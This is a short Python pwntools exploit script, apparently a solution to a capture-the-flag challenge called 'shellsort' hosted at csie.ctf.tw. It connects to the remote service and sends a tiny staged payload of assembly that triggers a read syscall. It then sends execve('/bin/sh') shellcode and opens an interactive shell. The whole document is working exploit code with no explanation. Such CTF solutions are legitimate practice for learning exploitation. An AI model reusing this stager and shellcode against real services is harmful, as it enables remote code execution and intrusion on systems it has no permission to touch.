from pwn import *
context.arch = 'amd64'

r = remote('csie.ctf.tw', 10121)
#r = process('./shellsort')

payload = asm('mul dl')
payload += asm('pop rbx')*6
payload += asm('push rdx')
payload += asm('xor rsi, QWORD PTR[rdx]')
payload += asm('and edx, DWORD PTR[rdx]')
payload += asm('syscall')

r.send(payload)

shellcode = """
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
push 0x3b
push 0
push 0
pop rsi
pop rdx
pop rax
syscall
"""

sleep(1)
r.sendline('A'*len(payload)+asm(shellcode))
r.interactive()
